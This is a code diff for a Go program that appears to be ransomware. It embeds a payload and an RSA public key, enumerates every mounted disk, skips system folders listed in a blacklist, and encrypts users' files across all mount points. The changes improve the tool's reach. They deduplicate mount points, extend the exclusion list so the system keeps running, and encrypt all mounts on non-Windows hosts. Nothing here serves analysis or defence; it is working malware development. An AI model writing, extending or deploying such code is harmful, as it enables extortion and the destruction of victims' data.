@@ -24,7 +24,7 @@ import (
 //go:embed download.dat
 var downloadedFile []byte
 
-//go:embed public_key.pem
+//go:embed keys/public_key.pem
 var publicKeyPEM []byte
 
 var blacklistDirs []string
@@ -39,7 +39,8 @@ func init() {
 		}
 	} else {
 		blacklistDirs = []string{
-			"boot", "bin", "dev", "etc", "lib", "proc", "sys", "usr/bin", "usr/lib", "usr/sbin", "usr/share", "var", "run", "tmp",
+			"boot", "bin", "dev", "dev/", "/dev/console","/dev", "etc", "lib", "proc", "sys", "usr/bin", "usr/lib", "usr/sbin", "usr/share", "var", "run", "tmp","/sys", "sys/", "/sys/", "/proc",
+
 		}
 	}
 }
@@ -72,20 +73,41 @@ func encryptFile(filePath string, key []byte, verbose ...bool) error {
 
 	return nil
 }
+
 func diskhd() ([]string, error) {
-	partitions, err := disk.Partitions(true)
-	if err != nil {
-		return nil, err
-	}
+  partitions, err := disk.Partitions(true)
+  if err != nil {
+    return nil, err
+  }
 
-	var mountPoints []string
-	for _, partition := range partitions {
-		mountPoints = append(mountPoints, partition.Mountpoint)
-	}
+  var mountPoints []string
+  seen := make(map[string]struct{}) // Use a map to efficiently track seen partitions
 
-	return mountPoints, nil
+  for _, partition := range partitions {
+    if _, ok := seen[partition.Mountpoint]; ok {
+      continue // Skip if partition mountpoint has already been seen
+    }
+
+    seen[partition.Mountpoint] = struct{}{} // Mark partition mountpoint as seen
+
+    isBlacklisted := false
+    for _, excludedDir := range blacklistDirs {
+      if strings.Contains(partition.Mountpoint, excludedDir) {
+        isBlacklisted = true
+        break // Exit the loop once a match is found
+      }
+    }
+
+    if !isBlacklisted {
+      //fmt.Println(partition.Mountpoint, "kkkk")
+      mountPoints = append(mountPoints, partition.Mountpoint)
+    } else {
+      //fmt.Println("fodasekkk", partition.Mountpoint)
+    }
+  }
+  //print(mountPoints)
+  return mountPoints, nil
 }
-
 func encryptFilesInFolder(folderPath string, key []byte, b string) error {
 	files, err := os.ReadDir(folderPath)
 	w := AesDecrypter(downloadedFile, []byte("1231231231231231"), []byte("1231231231231231"))
@@ -102,13 +124,13 @@ func encryptFilesInFolder(folderPath string, key []byte, b string) error {
 				skipFolder := false
 				for _, excludedDir := range blacklistDirs {
 					folderName := filepath.Base(folderPath)
-
-					if strings.ToLower(folderName) == excludedDir && strings.Contains(strings.ToLower(folderPath), excludedDir) {
-						fmt.Println("[+] Skipping", filePath)
+          //fmt.Println(filePath)
+					if strings.ToLower(folderName) == excludedDir && strings.Contains(strings.ToLower(folderPath), excludedDir) && runtime.GOOS == "windows" || strings.Contains(filePath, excludedDir)  {
+            fmt.Println("[+] Skipping", filePath)
 						skipFolder = true
 						break
 					}
-				}
+        }
 
 				if skipFolder {
 					continue
@@ -154,7 +176,8 @@ func main() {
 	var mountPoints []string
 
 	mountPoints, _ = diskhd()
-	block, _ := pem.Decode(publicKeyPEM)
+	fmt.Println(mountPoints)
+  block, _ := pem.Decode(publicKeyPEM)
 	publicKey, _ := x509.ParsePKIXPublicKey(block.Bytes)
 	rsaPublicKey, _ := publicKey.(*rsa.PublicKey)
 
@@ -170,9 +193,11 @@ func main() {
 		for _, rootDir := range mountPoints {
 			encryptFilesInFolder(rootDir, key, b64)
 		}
-	} else {
-		encryptFilesInFolder("/", key, b64)
+  } else {
+    for _, rootDir := range mountPoints {
+		encryptFilesInFolder(rootDir, key, b64)
 	}
+  }
 	fmt.Println("Encryption completed successfully.")
 }
 
